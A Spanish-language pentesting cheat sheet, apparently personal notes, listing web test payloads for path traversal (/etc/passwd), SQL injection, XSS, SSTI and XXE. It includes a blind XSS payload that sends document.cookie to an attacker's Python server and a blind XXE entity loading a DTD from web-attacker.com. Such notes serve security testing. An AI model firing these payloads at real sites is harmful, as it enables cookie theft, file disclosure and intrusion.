# Descargas de archivos (Path traversal)


Muchas veces cuando descargamos un archivo, el archivo a descargar se indica a traves de algun parametro, podemos testear un posible LFI o Path traversal, usualmente podemos usar la siguiente carga util:

```ruby
../../../../../../../../etc/passwd
```

En caso de que obtengamos el /etc/passwd, revisar el siguiente cocumento: [[Testeo de Path traversal]]

# Formularios (XSS + Python)


En estos casos nos encontramos frente a una especie de xss blind, ya que no lo podemos testear personalmente, solo nos  queda crear un servidor python de la siguiente manera:

```ruby
python -m http.server 1234 
```

Ahora enviar un a carga util XSS de la siguiente forma: 

```html
<img src="x" onerror="fetch('http://{IP}:{PUERTO}/' + document.cookie ) ">
```

De esta forma nos deberia llegar  una peticion con las cookies de quien carga este codigo.

# Login (SQLI)

Usualmente cuando estamos frente a un login, podemos intentar probar un SQL Injection, pero primero debemos confirmar la vulnerabilidad, para ello podemos injectar una comilla simple: `'` que deberia causar un error en el servidor, posteriormente ya podremos probar diferentes injecciones como: 

```sql
'-- -
```

# Llamadas a archivos (LFI)

![[Pasted image 20260529095355.png]]

# Se refleja (XSS, SSTI)

Cuando vemos que uno de nuestros inputs se refleja en la pagina usualmente podemos estar en frente a un XSS, podemos intentar enviar un XSS basico para ver como se comporta la aplicacion:

```html
<script>alert(1)</script>
```

```html
<img src="x" onerror="alert(1)"/>
```

### Se refleja en un anchor (Etiqueta \<a\>)

# XSS 

A veces nuestro input se usa para un link, por ejemplo cuando podemos indicarsi tenemos una pagina web, en este caso podemos usar la siguiente injeccion:

```js
javascript:alert(1)
```

# SSTI 

Tecnologias que pueden delatar un SSTI 

 - **Python**: Django, Jinja2, Mako, ...
- **Java**: Freemarker, Jinjava, Velocity, ...
- **Ruby**: ERB, Slim, ...

En la mayoria de los casos en los que nos encontramos un SSTI (Server Side Template Injection) es a travez de python gracias a la libreria de administracion de plantillas como jinja2, o simplemente cuando se usa el input de un usuario en una plantilla usando un framework, esta vulnerabilidad la podemos detectar con la siguiente carga util:

```python
${{<%[%'"}}%\.
```

Esto deberia causar un error en donde se refleja la injeccion.

https://cheatsheet.hackmanit.de/template-injection-table/

https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#inject-template-syntax

# Se envian datos en XML (XXE)

Cuando vemos que se envia un documento utilizando XML, podemos hacernos a la idea de un posible XXE (XML External Entity), podemos comprobar esta vulnerabilidad inyectando en el DOCTYPE una entidad malintencionada:

```ruby
<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
```

y luego llamar a esta entidad con:

```ruby
&xxe;
```

Para confirmar un XXE deberia aparecer el valor que le dimos a la entidad en donde la inyectamos es decir "test".


# Si no se reflejan

En este caso estamos en frente de un Blind XXE, lo cual podemos afrontar usando el siguiente payload:

```ruby
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Debemos iniciar un servidor, ya sea de python o con Collaborator.






